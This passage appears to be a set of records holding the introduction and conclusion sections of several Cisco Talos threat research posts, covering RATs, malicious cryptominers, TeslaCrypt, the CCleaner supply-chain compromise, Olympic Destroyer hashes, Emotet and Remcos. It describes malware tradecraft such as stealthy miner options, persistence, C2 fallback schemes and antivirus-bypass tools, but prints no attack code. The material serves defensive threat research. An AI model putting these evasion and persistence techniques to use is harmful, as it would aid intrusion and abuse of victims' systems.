their own infrastructure, to using filing sharing services, and now abusing chat applications and that is just from email based threats. The name of the game is getting malware onto end systems and as we've seen repeatedly the bad guys will do whatever is necessary to achieve these goals. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware detailed in this post. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat. \nThreat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nAdditional protections with context to your specific environment and threat data are available from the Firepower Management Center. ", "source": "Cisco"}, {"title": "Introduction", "content": "Orcus RAT and RevengeRAT are two of the most popular remote access trojans (RATs) in use across the threat landscape. Since its emergence in 2016, various adversaries used RevengeRAT to attack organizations and individuals around the world. The source code associated with RevengeRAT was previously released to the public, allowing attackers to leverage it for their own malicious purposes. There are typically numerous, unrelated attackers attempting to leverage this RAT to compromise corporate networks for the purposes of establishing an initial point of network access, the performance of lateral movement, as well as to exfiltrate sensitive information that can be monetized. Orcus RAT was in the news earlier this year due to Canadian law enforcement activity related to the individual believed to have authored the malware. \nCisco Talos recently discovered a threat actor that has been leveraging RevengeRAT and Orcus RAT in various malware distribution campaigns targeting organizations including government entities, financial services organizations, information technology service providers and consultancies. We discovered several unique tactics, techniques, and procedures (TTPs) associated with these campaigns including the use of persistence techniques most commonly associated with \"fileless\" malware, obfuscation techniques designed to mask C2 infrastructure, as well as evasion designed to circumvent analysis by automated analysis platforms such as malware sandboxes. \nThe characteristics associated with these campaigns evolved over time, showing the attacker is constantly changing their tactics in an attempt to maximize their ability to infect corporate systems and work toward the achievement of their longer-term objectives. ", "source": "Cisco"}, {"title": "Conclusion", "content": "These malware distribution campaigns are ongoing and will likely continue to be observed targeting various organizations around the world. RevengeRAT and Orcus RAT are two of the most popular RATs in use across the threat landscape and will likely continue to be heavily favored for use during the initial stages of attacks. \nOrganizations should leverage comprehensive defense-in-depth security controls to ensure that they are not adversely impacted by attacks featuring these malware families. At any given point in time, there are several unrelated attackers distributing these RATs in different ways. Given that the source code of both of these malware families is readily available, we will likely continue to see new variants of each of these RATs for the foreseeable future. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nWEDNESDAY, JANUARY 31, 2018 10:58\nhis post was authored by Nick Biasini, Edmund Brumaghin, Warren Mercer and Josh Reynolds with contributions from Azim Khodijbaev and David Liebenberg. \nExecutive Summary \nThe threat landscape is constantly changing; over the last few years malware threat vectors, methods and payloads have rapidly evolved. Recently, as cryptocurrency values have exploded, mining related attacks have emerged as a primary interest for many attackers who are beginning to recognize that they can realize all of the financial upside of previous attacks, like ransomware, without needing to actually engage the victim and without the extraneous law enforcement attention that comes with ransomware attacks. \nThis focus on mining isn't entirely surprising, considering that various cryptocurrencies along with \"blockchain\" have been all over the news as the value of these currencies has exponentially \nincreased. Adversaries have taken note of these gains and have been creating new attacks that help them monetize this growth. Over the past several months Talos has observed a marked increase in the volume of cryptocurrency mining software being maliciously delivered to victims. \nIn this new business model, attackers are no longer penalizing victims for opening an attachment, or running a malicious script by taking systems hostage and demanding a ransom. Now attackers are actively leveraging the resources of infected systems for cryptocurrency mining. In these cases the better the performance and computing power of the targeted system, the better for the attacker from a revenue generation perspective. IoT devices, with their lack of monitoring and lack of day to day user engagement, are fast becoming an attractive target for these attackers, as they offer processing power without direct victim oversight. While the computing resources within most IoT devices are generally limited, the number of exposed devices that are vulnerable to publicly available exploits is high which may make them attractive to cyber criminals moving forward. \nTo put the financial gains in perspective, an average system would likely generate about \\$0.25 of Monero per day, meaning that an adversary who has enlisted 2,000 victims (not a hard feat), could generate \\$500 per day or \\$182,500 per year. Talos has observed botnets consisting of millions of infected systems, which using our previous logic means that these systems could be leveraged to generate more than \\$100 million per year theoretically. It is important to note that due to volatility present across cryptocurrency markets, these values may change drastically from day to day. All calculations in this blog were made based on XMR/USD at the time of this writing. \nThis is all done with minimal effort following the initial infection. More importantly, with little chance of being detected, this revenue stream can continue in perpetuity. While these are impressive figures, it's also important to factor in a few details that can further increase the value of these attacks exponentially: \nThe value of many cryptocurrencies are skyrocketing. Monero, one of the most popular mining targets, saw a 3000% increase over the last 12 months.   \nThese attacks are much stealthier than their predecessors. Attackers are not stealing anything more than computing power from their victims and the mining software isn't technically malware -- So theoretically, the victims could remain part of the adversary's botnet for as long as the attacker chooses.   \nOnce the currency is mined, there is no telling what the attacker might do with it. This could become a long term investment (or even retirement) scheme for these attackers \u2013 sitting on this currency until it hits such a point where the attacker decides to cash in. ", "source": "Cisco"}, {"title": "Introduction", "content": "Throughout the past couple of years ransomware has dominated the threat landscape and for good reason. It creates a highly profitable business model that allows attackers to directly monetize their nefarious activities. However, there are a couple of limitations with the use of ransomware. First is the fact that only a small percentage of infected users will actually pay the ransom demanded by the attacker. Second, as systems and technology get better at detecting and blocking ransomware attacks the pool of possible victims is changing. Potential victims in many countries lack the financial capabilities to pay \\$300-\\$500 to retrieve their data. Possibly related to these aforementioned limitations, we have begun to see a steady shift in the payloads that are being delivered. This is especially true for some of the most common methods for malware distribution such as exploit kits and spam campaigns. \nOver the past several months Talos has started to observe a marked increase in the volume of cryptocurrency miners being delivered to victims. Cryptocurrency and \"blockchain\" have been all over the news over the past several months as the value of these currencies has increased on an exponential path. One of the most effective ways to generate these currencies is through mining and adversaries are obviously paying attention. \nWhat is 'Mining'? \nAt a high level mining is simply using system resources to solve large mathematical calculations which result in some amount of cryptocurrency being awarded to the solvers. Before we get too deep into mining let's address the currencies that make sense to mine. \nBitcoin (BTC) is the most well known and widely used cryptocurrency by a wide margin. It's been mined since its inception, but today mining isn't an effective way to generate value. If you look across all of the cryptocurrencies, there are only a couple that are worth mining without specialized hardware called ASICs (Application Specific Integrated Circuits). The differences across the different cryptocurrencies are based on the hashing algorithm used. Some have been specifically designed in an attempt to prevent or hinder the use of such specialised hardware and are more focused on consumer grade equipment such as CPU & GPU hardware. Currently, the most valuable currency to mine with standard systems is Monero (XMR) and adversaries have done their research. In addition Monero is extremely privacy conscious and as governments have started to scrutinize Bitcoin more closely, Monero and other coins with heavy emphasis on privacy may become a safe haven for threat actors. \nThere are two ways that mining can be performed, either with a stand alone miner or by leveraging mining pools. Pool-based crypto mining allows you to pool the resources of multiple systems resulting in a higher hashrate and theoretically the production of increased amounts of currency. It's pool-based mining of Monero that we have seen most frequently leveraged by attackers as it allows for the greatest amount of return on investment and the required mining software can be easily delivered to victims. The use of pooled mining also maximizes the effectiveness of the computing resources found in standard systems that attackers attempt to compromise. This is similar to launching Distributed Denial of Service (DDoS) attacks where 100,000 machines flooding a target with bogus traffic becomes much more effective compared to a single system under the attacker's control sending bogus traffic. \nHow does pool based mining work? \nPool-based mining is coordinated through the use of 'Worker IDs'. These IDs are what tie an individual system to a larger pool and ensures the coin mined by the pool that is associated with a particular Worker ID are delivered to the correct user. It's these Worker IDs that allowed us to determine the size and scale of some of the malicious operations as well as get an idea of the amount of revenue adversaries are generating. For the purposes of this discussion we will be assuming the following: \n1. The amount of hashes per second that a typical computer can compute will be assumed to be \\~125 H/s. \n2. While in reality mining does not always guarantee successful generation of the cryptocurrency being mined, we will assume that for our purposes it is successful as it allows for a better understanding of the earning potential for these malicious mining pools. \nThese miners typically operate from the command line and make use of a series of arguments used to establish how the mining should be performed. A typical example of the command line syntax used to execute the mining software and specify the arguments is below: (note that there are variations in the parameter names used based on the specific mining software being used.) \nAs you can see there are two primary argument values required: The URL for the mining pool and the 'Worker ID' that is used to tie the mining activity taking place on the system to a specific mining pool which is used to manage how payouts are conducted. However, through our investigation we have found a plethora of other parameters that attackers or miners can specify in an attempt to hide their activities. If the mining software is executed without these options, victims might notice significant performance degradation on their systems as no computing resource limits are enforced. These options include: \nLimits on CPU Usage.   \nLimits on System Temperature.   \nAmount of cores being used.   \nSleep periods. \nEach mining program comes with its own set of flags that are taken advantage of in various ways by both legitimate and malicious miners. We have observed that these options are typically deployed by the attackers when they achieve persistence (i.e. through the creation of Scheduled Tasks or Run keys that execute the miner using the Windows Command Processor specifying the arguments to use). ", "source": "Cisco"}, {"title": "Conclusion", "content": "The number of ways adversaries are delivering miners to end users is staggering. It is reminiscent of the explosion of ransomware we saw several years ago. This is indicative of a major shift in the types of payloads adversaries are trying to deliver. It helps show that the effectiveness of ransomware as a payload is limited. It will always be effective to ransom specific \nhttps://blog.talosintelligence.com/malicious-xmr-mining/ \norganizations or to use in targeted attacks, but as a payload to compromise random victims its reach definitely has limits. At some point the pool of potential victims becomes too small to generate the revenue expected. \nCrypto miners may well be the new payload of choice for adversaries. It has been and will always be about money and crypto mining is an effective way to generate revenue. It's not going to generate large sums of money for each individual system, but when you group together hundreds or thousands of systems it can be extremely profitable. It's also a more covert threat than ransomware. A user is far less likely to know a malicious miner is installed on the system other than some occasional slow down. This increases the time a system is infected and generating revenue. In many ways its the exact opposite of ransomware. Ransomware is designed to generate revenue in a couple of days from a victim and the payoff is immediate. Malicious miners are designed to exist on a system for weeks, months, or ideally years. \nIt also introduces a new challenge to enterprises. A decision needs to be made on how to treat things like miners and whether they should be judged exclusively as malware. Each enterprise needs to decide how to handle these threats. The first step is determining how prevalent they are in your environment and then deciding how to handle it going forward. ", "source": "Cisco"}, {"title": "Introduction", "content": "On May 15, 2020, Microsoft kicked off the Azure Sphere Security Research Challenge, a threemonth initiative aimed at finding bugs in Azure Sphere. Among the teams and individuals selected, Cisco Talos conducted a three-month sprint of research into the platform and reported 16 vulnerabilities of various severity, including a privilege escalation bug chain to acquire Azure Sphere Capabilities, the most valuable Linux normal-world permissions in the Azure Sphere context. \nThe Azure Sphere platform is a cloud-connected and custom SoC platform designed specifically for IoT application security. Internally, the SoC is made up of a set of several ARM cores that have different roles (e.g. running different types of applications, enforcing security, and managing encryption). Externally, the Azure Sphere platform is supported by Microsoft's Azure Cloud, which handles secure updates, app deployment, and periodic verification of device integrity to determine if Azure Cloud access should be allowed or not. Note however, that while the Azure Sphere is updated and deploys through the Azure Cloud, customers can still interact with their own servers independently. ", "source": "Cisco"}, {"title": "Conclusion", "content": "During the course of the three-month Azure Sphere Security Research Challenge, Cisco Talos found and reported 16 vulnerabilities in the Azure Sphere platform, (TALOS-2020-1141 is not yet fixed so it remains unpublished). For an in-depth look into each of the vulnerabilities, please refer to the individual vulnerability writeups listed above for more information. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Andrea Allievi, Earl Carter \nMONDAY, APRIL 27, 2015 04:39 \nTHREAT SPOTLIGHT\nThis post was authored by: Andrea Allievi, Earl Carter & Emmanuel Tacheau Update 4/28: Windows files recompiled with backward compatibility in Visual Studio 2008 Update 5/8: We've made the source code available via Github here \nAfter the takedown of Cryptolocker, we have seen the rise of Cryptowall. Cryptowall 2 introduced \"features\" such as advanced anti-debugging techniques, only to have many of those features removed in Cryptowall 3. Ransomware is becoming an extremely lucrative business, leading to many variants and campaigns targeting even localized regions in their own specific languages. Although it is possible that these multiple variants are sponsored by the same threat actor, the most likely conclusion is that multiple threat actors are jumping in to claim a portion of an ever increasing ransomware market. One of the latest variants is called TeslaCrypt and appears to be a derivative of the original Cryptolocker ransomware. Although it claims to be using asymmetric RSA-2048 to encrypt files, it is making use of symmetric AES instead. Talos was able to develop a tool which decrypts the files encrypted by the TeslaCrypt ransomware. ", "source": "Cisco"}, {"title": "Introduction", "content": "After the initialization routine and the deletion of the Volume Shadow copies, the sample creates the \"key.dat\" file where it stores all the encryption keys. The dropper from March 2015 calculates at least 2 different main keys: a payment key and a master encryption key. The other dropper implements the concept of an additional key known as the \"Recovery key'. \n\"GetAndHashOsData\" is the function responsible for creating the base buffer for the generation of all keys. At startup it acquires the following info: \nthe global workstation's LAN network statistics, using the NetStatisticsGet API function   \n64 random bytes generated by Windows Crypto functions   \nall heap descriptors of its own process   \nall active process descriptors and the threads descriptors of each process   \nall loaded modules in each process the workstation's physical memory information \nOnce the data is acquired, it generates a big array of SHA1 values, one for every 20 bytes of acquired data. At the end it calculates and stores a global SHA1 value for the entire array, in a symbol that we have called \"g_lpGlobalOsDataSha1\". \nWith these 2 items, the \"FillBuffWithEncryptedOsData\" routine is able to fill a generic buffer with the calculated data, in a pseudo-random manner. A master key and a payment key are generated using this function (each key is 32 bytes wide), their SHA256 is calculated and finally a custom algorithm is used to shift left and shift right the 2 keys. The two shifted SHA256 values are stored in the \"key.dat\" file. \nThe Key File \nThe \"OpenKeyFileAndWrite\" routine tries to open the \"key.dat\" file, located in the user's Application Data directory. If it doesn't exist, it generates the 2 master keys (3 in case of the most recent dropper) as well as other keys, and stores them in the key file. \nHere is a little schema of the layout of the \"key.dat\" file: \nTeslaCrypt-Keydat \n\\* = We currently don't know precisely how this value is used by TeslaCrypt The latest version of the dropper creates a \"RECOVERY_KEY.TXT\" file inside the user's document directory. It does this to achieve a particular goal: if the victim workstation is offline or if a firewall blocks the communication with the C&C server, the dropper will proceed with the destruction of the master key inside the \"key.dat\" file, after the encryption of all files has been completed. To recover the files, the user would have to connect to the threat actor's TOR website and provide the recovery key. The threat actors use a custom algorithm to to recover the master key from the recovery key: ", "source": "Cisco"}, {"title": "Conclusion", "content": "Analysing TeslaCrypt ransomware was a challenge. All the encryption and hashing algorithms in the dropper made the analysis pretty difficult. As we have seen, sometimes the threat actors authors even lie. Nevertheless, ransomware continues to plague users. Incorporating a layered defense is critical to combating this type of threat before it has the chance to encrypt files. A good system backup policy is the best way to recover files that have been hijacked. \ncoveragetable \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nThe Network Security protection of IPSand NGFW have up-to-date signatures to detect malicious network activity by threat actors. \nESA can block malicious emails including phishing and malicious attachments sent by threat actors as part of their campaign. \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin, Warren Mercer, Craig Williams \nMONDAY, SEPTEMBER 18, 2017 03:51 \nTHREAT ADVISORY \nUpdate 9/18: CCleaner Cloud version 1.07.3191 is also reported to be affected Update 9/19: This issue was discovered and reported by both Morphisec and Cisco in separate infield cases and reported separately to Avast. \nUpdate 9/19: There has been some confusion on how the DGA domains resolve. \nThe fallback command and control scheme in use by the CCBkdr involves: \n1. Generating a Monthly Domain name (all of which are controlled by Talos for 2017)   \n2. Request the A records for the domain.   \n3. 16 bits of the true destination IP are encoded in the first A record, 16 bits are encoded in the second A record   \n4. The true destination IP is then computed and connected to.   \nTo control the connections Talos has to create two IPs such that they can be fed into the application to resolve to the sinkhole IP.   \n32 bits of random data were generated. 16 bits of that were combined with 16 bits of the destination address to create the first A record. The remaining 16 random bits were combined with the remaining bits of the destination address to create the second A record.   \nThe resulting two A record IP addresses were then assigned to the DNS configuration.   \nThere was no analysis performed on the selected addresses beyond that they could be combine to create the destination. \nUpdate 9/20: Continued research on C2 and payloads can be found here: /ccleaner-c2-concern ", "source": "Cisco"}, {"title": "Introduction", "content": "Supply chain attacks are a very effective way to distribute malicious software into target organizations. This is because with supply chain attacks, the attackers are relying on the trust relationship between a manufacturer or supplier and a customer. This trust relationship is then abused to attack organizations and individuals and may be performed for a number of different reasons. The Nyetya worm that was released into the wild earlier in 2017 showed just how potent these types of attacks can be. Frequently, as with Nyetya, the initial infection vector can remain elusive for quite some time. Luckily with tools like AMP the additional visibility can usually help direct attention to the initial vector. \nTalos recently observed a case where the download servers used by software vendor to distribute a legitimate software package were leveraged to deliver malware to unsuspecting victims. For a period of time, the legitimate signed version of CCleaner 5.33 being distributed by Avast also contained a multi-stage malware payload that rode on top of the installation of CCleaner. CCleaner boasted over 2 billion total downloads by November of 2016 with a growth rate of 5 million additional users per week. Given the potential damage that could be caused by a network of infected computers even a tiny fraction of this size we decided to move quickly. On September 13, 2017 Cisco Talos immediately notified Avast of our findings so that they could initiate appropriate response activities. The following sections will discuss the specific details regarding this attack. \nTechnical Details \nCCleaner is an application that allows users to perform routine maintenance on their systems. It includes functionality such as cleaning of temporary files, analyzing the system to determine ways in which performance can be optimized and provides a more streamlined way to manage installed applications. \nOn September 13, 2017 while conducting customer beta testing of our new exploit detection technology, Cisco Talos identified a specific executable which was triggering our advanced malware protection systems. Upon closer inspection, the executable in question was the installer for CCleaner v5.33, which was being delivered to endpoints by the legitimate CCleaner download servers. Talos began initial analysis to determine what was causing this technology to flag CCleaner. We identified that even though the downloaded installation executable was signed using a valid digital signature issued to Piriform, CCleaner was not the only application that came with the download. During the installation of CCleaner 5.33, the 32-bit CCleaner binary that was included also contained a malicious payload that featured a Domain Generation Algorithm (DGA) as well as hardcoded Command and Control (C2) functionality. We confirmed that this malicious version of CCleaner was being hosted directly on CCleaner's download server as recently as September 11, 2017. \nIn reviewing the Version History page on the CCleaner download site, it appears that the affected version (5.33) was released on August 15, 2017. On September 12, 2017 version 5.34 was released. The version containing the malicious payload (5.33) was being distributed between these dates. This version was signed using a valid certificate that was issued to Piriform Ltd by Symantec and is valid through 10/10/2018. Piriform was the company that Avast recently acquired and was the original company who developed the CCleaner software application. \nThe presence of a valid digital signature on the malicious CCleaner binary may be indicative of a larger issue that resulted in portions of the development or signing process being compromised. Ideally this certificate should be revoked and untrusted moving forward. When generating a new cert care must be taken to ensure attackers have no foothold within the environment with which to compromise the new certificate. Only the incident response process can provide details regarding the scope of this issue and how to best address it. \nInterestingly the following compilation artifact was found within the CCleaner binary that Talos analyzed: \nS:\\workspace\\ccleaner\\branches\\v5.33\\bin\\CCleaner\\Release\\CCleaner.pdb \nGiven the presence of this compilation artifact as well as the fact that the binary was digitally signed using a valid certificate issued to the software developer, it is likely that an external attacker compromised a portion of their development or build environment and leveraged that access to insert malware into the CCleaner build that was released and hosted by the organization. It is also possible that an insider with access to either the development or build environments within the organization intentionally included the malicious code or could have had an account (or similar) compromised which allowed an attacker to include the code. \nIt is also important to note that while previous versions of the CCleaner installer are currently still available on the download server, the version containing the malicious payloads has been removed and is no longer available. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This is a prime example of the extent that attackers are willing to go through in their attempt to distribute malware to organizations and individuals around the world. By exploiting the trust relationship between software vendors and the users of their software, attackers can benefit from users' inherent trust in the files and web servers used to distribute updates. In many organizations data received from commonly software vendors rarely receives the same level of scrutiny as that which is applied to what is perceived as untrusted sources. Attackers have shown that they are willing to leverage this trust to distribute malware while remaining undetected. Cisco Talos continues to monitor all aspects of the threat landscape to quickly identify new and innovative techniques used by attackers to target organizations and individuals around the world. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Nick Biasini \nWEDNESDAY, JULY 13, 2022 19:58\nTHREAT SPOTLIGHT\nCisco Talos has been tracking a new malicious campaign operated by the Transparent Tribe APT group. \nThis campaign involves the targeting of educational institutions and students in the Indian subcontinent, a deviation from the adversary's typical focus on government entities. \nThe attacks result in the deployment of CrimsonRAT, Transparent Tribe's malware of choice for establishing long-term access into victim networks. \nWe assess with high confidence that a Pakistani web hosting services provider \"Zain Hosting\" was used for deploying and operating components of Transparent Tribe's infrastructure. This is likely one of many third parties Transparent Tribe employs to prepare, stage and/or deploy components of their operation. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Transparent Tribe has been aggressively trying to widen its net of victims in the Indian subcontinent. Their operations started as early as at least 2016 and have largely focussed on infecting government and military officials in Afghanistan and India. Over the past few years, we saw the APT begin targeting pseudo-government entities and individuals belonging to think tanks and defense contractors. \nHowever, their new campaign indicates that the threat actors' strategy is evolving to target civilian personnel, specifically those connected to educational institutions. This might be in accordance with their nation-state's goal to establish long-term access and steal valuable and restricted research from premier research institutions associated with the Indian government. Keeping tabs on an adversary nation's research endeavors is a strategic goal adopted by many APT groups observed across the world. \nOrganizations must be diligent against such highly motivated adversaries that are rapidly evolving their strategies and expanding their network of targets. In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises and reviewed and improved every time it's put to the test on real engagements. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Warren Mercer \nMONDAY, FEBRUARY 12, 2018 08:16 \nThis blog post is authored by Warren Mercer and Paul Rascagneres. Ben Baker and Matthew Molyett contributed to this post. \nUpdate 2/13 08:30 We have updated the information regarding the use of stolen credentials ", "source": "Cisco"}, {"title": "Conclusion", "content": "During destructive attacks like this there often has to be a thought given to the nature of the attack. Disruption is the clear objective in this type of attack and it leaves us confident in thinking that the actors behind this were after embarrassment of the Olympic committee during the opening ceremony. \nDisruption of services included the Olympic website being offline, meaning individuals could not print their tickets. The opening ceremony reporting was degraded due to WiFi failing for reporters on site. \nThe malware delivery mechanism is currently unknown which means the infection vector could be a multitude of options, but, if the attacker already had access to the environment, this attack could have been carried out remotely. This would allow the actors to specifically pinpoint the moment of the opening ceremony and would allow them to control their time of impact. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOCs \nOlympic Destroyer: edb1ff2521fb4bf748111f92786d260d40407a2e8463dcd24bb09f908ee13eb9 \nBrowser Stealer: 19ab44a1343db19741b0e0b06bacce55990b6c8f789815daaf3476e0cc30ebea (unpacked: ab5bf79274b6583a00be203256a4eacfa30a37bc889b5493da9456e2d5885c7f ) \nSystem Stealer: f188abc33d351c2254d794b525c5a8b79ea78acd3050cd8d27d3ecfc568c2936 (unpacked a7d6dcdf5ca2c426cc6c447cff76834d97bc1fdff2cd14bad0b7c2817408c334 ) \nDestroyer: ae9a4e244a9b3c77d489dee8aeaf35a7c3ba31b210e76d81ef2e91790f052c85 \nPsexec (legit): 3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef \nAdditional Olympic Destroyer: \nD934CB8D0EADB93F8A57A9B8853C5DB218D5DB78C16A35F374E413884D915016 EDB1FF2521FB4BF748111F92786D260D40407A2E8463DCD24BB09F908EE13EB9 3E27B6B287F0B9F7E85BFE18901D961110AE969D58B44AF15B1D75BE749022C2 28858CC6E05225F7D156D1C6A21ED11188777FA0A752CB7B56038D79A88627CC \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "By Kelly Patterson \nWEDNESDAY, AUGUST 28, 2024 12:00\nVULNERABILITY DEEP DIVE \nThis is the final post in the three-part series that details techniques I used to fuzz two \u00b5C/OS protocol stacks: \u00b5C/TCP-IP and \u00b5C/HTTP-server. \nThe first post highlighted code modifications necessary for developing a fuzzing harness tailored for the \u00b5C/HTTP-server. The second discussed a technique for delivering multiple requests per fuzz test case. Finally, I'll detail the code modifications required for fuzzing the \u00b5C/TCP-IP stack. Please refer to the first post in the series for a description of Real-Time Operating Systems (RTOS) and the motivations for this research project. \nMy goals in fuzzing \u00b5C/TCP-IP are the same as for \u00b5C/HTTP-server: \nUse a modern fuzzing framework (I chose AFL++).   \nModify the networking code to accept input from a file.   \nHandle multiple requests per test case. \nSelf-imposed constraints: \nA software-only solution.   \nRun natively on Linux. \nI wanted to find a straightforward way to fuzz this code without relying on emulation or dedicated hardware. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Thank you for following along in this series about fuzzing \u00b5COS protocol stacks. To recap, we created software-only fuzzing solutions for fuzzing \u00b5C/HTTP-server and \u00b5C/TCP-IP. The fuzzing solutions discussed here include the ability to run natively on Linux and accept input from a file. We also covered a feature contribution to libdesock which allows for multiple requests to be processed by the application in a single test case, resulting in more complex vulnerability findings. My hope is that the techniques described in this series will encourage others to fuzz other RTOS platforms to make these important systems more secure. \nBelow is a list of vulnerabilities that were disclosed because of this research presented in this blog series: \nTALOS-2023-1726: Buffer overflow vulnerability TALOS-2023-1732: Memory corruption vulnerability TALOS-2023-1733: Heap-based buffer overflow vulnerability TALOS-2023-1738: Memory corruption vulnerability TALOS-2023-1746: Memory corruption vulnerability TALOS-2023-1828: Denail of service vulnerability TALOS-2023-1829: Double-free vulnerability TALOS-2023-1843: Heap-based buffer overflow vulnerability \nThe following is a list of Snort rules that will detect exploitation attempts against these vulnerabilities: 119:201, 119:281, 1:12685, 1:39908, 119:203:1, 119:282:1, 116:2 and 116:151. Additional rules may be released in the future and current rules are subject to change, pending additional vulnerability information. For the most current rule information, please refer to your Cisco Secure Firewall or Snort.org. \nSmall praise for modern compilers - A case of Ubuntu printing vulnerability that wasn't \nF E B R UA RY 1 0 , 2 0 2 5 0 8 : 3 0 \nDuring an earlier investigation of the macOS printing subsystem, IPP-USB protocol caught our attention.   \nWe decided to take a look at how other operating systems handle the same functionality. \nFinding vulnerabilities in ClipSp, the driver at the core of Windows' Client License Platform \nN OV E M B E R 2 5 , 2 0 2 4 0 8 : 0 0 \nBy Philippe Laulheret ClipSP (clipsp.sys) is a Windows driver used to implement client licensing and system policies on Windows 10 and 11 systems. Cisco Talos researchers have discovered eight vulnerabilities related to clipsp.sys ranging from signature bypass to elevation of privileges and sandbox escape: \\* TALOS-2024-1964 (CVE-2024-38184) \\* TALOS-2024-1965 (CVE-2024-38185) \nThe vulnerabilities we uncovered by fuzzing \u00b5C/OS protocol stacks AU G U S T 2 8 , 2 0 2 4 1 2 : 0 0 \nFuzzing has long been one of our favorite ways to search for security issues or vulnerabilities in software, but when it comes to fuzzing popular systems used in ICS environments, it traditionally involved a custom hardware setup to fuzz the code in its native environment. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Colin Grady, Jaeson Schultz, William Largent \nTUESDAY, SEPTEMBER 17, 2019 16:00 \nTHREAT SPOTLIGHT\nEmotet is still evolving, five years after its debut as a banking trojan. It is one of the world's most dangerous botnets and malware droppers-for-hire. The malware payloads dropped by Emotet serve to more fully monetize their attacks, and often include additional banking trojans, information stealers, email harvesters, self-propagation mechanisms and even ransomware. \nAt the beginning of June 2019, Emotet's operators decided to take an extended summer vacation. Even the command and control (C2) activities saw a major pause in activity. However, as summer begins drawing to a close, Talos and other researchers started to see increased activity in \nEmotet's C2 infrastructure. And as of Sept. 16, 2019, the Emotet botnet has fully reawakened, and has resumed spamming operations once again. While this reemergence may have many users scared, Talos' traditional Emotet coverage and protection remains the same. We have a slew of new IOCs to help protect users from this latest push, but past Snort coverage will still block this malware, as well traditional best security practices such as avoiding opening suspicious email attachments and using strong passwords. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Emotet has been around for years, this reemergence comes as no surprise. The good news is, the same advice for staying protected from Emotet remains. To avoid Emotet taking advantage of your email account, be sure to use strong passwords and opt in to multi-factor authentication, if your email provider offers that as an option. Be wary of emails that seem to be unexpected replies to old threads, emails that seem suspiciously out of context, or those messages that come from familiar names but unfamiliar email addresses. As always, you can rely on Snort rules to keep your system and network protected, as well. Previous Snort rules Talos has released will still protect from this wave of Emotet, and there is always the opportunity for new coverage in the future. \nThis is also a good opportunity to recognize that security researchers and practitioners can never take their foot off the gas. When a threat group goes silent, it's unlikely they'll be gone forever. Rather, this opens up the opportunity for a threat group to return with new IOCs, tactics, techniques and procedures or new malware variants that can avoid existing detection. Just as we saw earlier this year with the alleged breakup of the threat actors behind Gandcrab, it's never safe to assume a threat is gone for good. ", "source": "Cisco"}, {"title": "Introduction", "content": "Picking Apart Remcos Botnet-In-A-Box \nBy Edmund Brumaghin \nWEDNESDAY, AUGUST 22, 2018 12:00\nThis blog post was authored by Edmund Brumaghin and Holger Unterbrink with contributions from Eric Kuhla and Lilia Gonzalez Medina. \nOverview \nCisco Talos has recently observed multiple campaigns using the Remcos remote access tool (RAT) that is offered for sale by a company called Breaking Security. While the company says it will only sell the software for legitimate uses as described in comments in response to the article here and will revoke the licenses for users not following their EULA, the sale of the RAT gives attackers everything they need to establish and run a potentially illegal botnet. \nRemcos' prices per license range from \u20ac58 to \u20ac389. Breaking Security also offers customers the ability to pay for the RAT using a variety of digital currencies. This RAT can be used to fully control and monitor any Windows operating system, from Windows XP and all versions thereafter, including server editions. \nIn addition to Remcos, Breaking Security is also offering Octopus Protector, a cryptor designed to allow malicious software to bypass detection by anti-malware products by encrypting the software on the disk. A YouTube video available on the Breaking Security channel demonstrates the tool's ability to facilitate the bypass of several antivirus protections. Additional products offered by this company include a keylogger, which can be used to record and send the keystrokes made on an infected system, a mass mailer that can be used to send large volumes of spam emails, and a DynDNS service that can be leveraged for post-compromise command and control (C2) communications. These tools, when combined with Remcos provide all the tools and infrastructure needed to build and maintain a botnet. \nWithin Cisco's Advanced Malware Protection (AMP) telemetry, we have observed several instances of attempts to install this RAT on various endpoints. As described below, we have also seen multiple malware campaigns distributing Remcos, with many of these campaigns using different methods to avoid detection. To help people who became victims of a harmful use of Remcos, Talos is providing a decoder script that can extract the C2 server addresses and other information from the Remcos binary. Please see the Technical Details section below for more information. ", "source": "Cisco"}, {"title": "Conclusion", "content": "While the organization that sells Remcos claims that the application is only for legal use, our research indicates it is still being used extensively by malicious attackers, as well. In some cases, attackers are strategically targeting victims to attempt to gain access to organizations that operate as part of the supply chain for various critical infrastructure sectors. Organizations should ensure that they are implementing security controls to combat 